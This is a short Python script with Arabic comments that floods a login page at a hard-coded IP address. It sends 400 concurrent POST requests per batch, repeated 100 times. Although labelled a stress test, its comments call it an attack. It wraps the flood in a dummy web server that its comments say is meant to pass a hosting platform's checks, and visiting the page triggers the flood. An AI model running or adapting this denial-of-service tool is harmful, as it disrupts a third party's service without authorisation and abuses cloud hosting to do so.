import asyncio
import aiohttp
from aiohttp import web

# 1. إعداد الرابط والبيانات الذكية
TARGET_URL = "http://187.7.17.67/sudani/login2.php"
PAYLOAD = {
    'account': '123456789',
    'account_number': '123456789',
    'accountNumber': '123456789',
    'username': '123456789',
    'phone': '123456789',
    'phoneNumber': '123456789',
    'password': 'test_password'
}

# 2. كود إرسال الطلبات المتوازية بسرعة فائقة دون استهلاك الذاكرة
async def run_stress_test():
    concurrency_batch = 400  # طاقة هجوم مكثفة ومستقرة للبايثون
    total_batches = 100
    
    async with aiohttp.ClientSession() as session:
        for batch in range(1, total_batches + 1):
            tasks = []
            for _ in range(concurrency_batch):
                tasks.append(session.post(TARGET_URL, data=PAYLOAD, timeout=3))
            
            # إطلاق الدفعة بالكامل في نفس الميكرو ثانية
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            success = sum(1 for r in results if isinstance(r, aiohttp.ClientResponse) and r.status == 200)
            print(f"📦 Batch [{batch}/{total_batches}] -> Success 200: {success}", flush=True)
            await asyncio.sleep(0.05)

# 3. تشغيل السيرفر الوهمي المطلوب لتخطي فحص Render بنجاح 100%
async def handle(request):
    # بمجرد فتح الرابط، سيبدأ اختبار الحمل فوراً في الخلفية
    asyncio.create_task(run_stress_test())
    return web.Response(text="⚡ Rocket Attack Started Successfully in Background! Check Logs.")

app = web.Application()
app.router.add_get('/', handle)

if __name__ == '__main__':
    import os
    port = int(os.environ.get("PORT", 80))
    web.run_app(app, host='0.0.0.0', port=port)
